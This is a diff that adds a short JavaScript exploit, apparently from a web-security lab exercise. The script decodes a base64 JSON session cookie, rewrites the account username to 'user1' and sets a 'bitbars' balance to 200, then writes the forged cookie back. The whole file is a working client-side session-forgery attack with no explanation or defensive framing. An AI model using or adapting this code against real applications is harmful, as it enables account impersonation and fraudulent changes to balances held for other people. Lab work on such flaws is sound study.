@@ -1,0 +1,14 @@
+var cookie=document.cookie;
+// console.log(cookie);
+var cookie_value=cookie.split("session=").pop();
+// console.log(cookie_value);
+var jsonstr=atob(cookie_value);
+// console.log(jsonstr);
+var json=JSON.parse(jsonstr);
+
+json.account.username="user1";
+json.account.bitbars=200;
+
+var user1_cookie=JSON.stringify(json);
+// console.log(user1_cookie);
+document.cookie="session=".concat(btoa(user1_cookie));
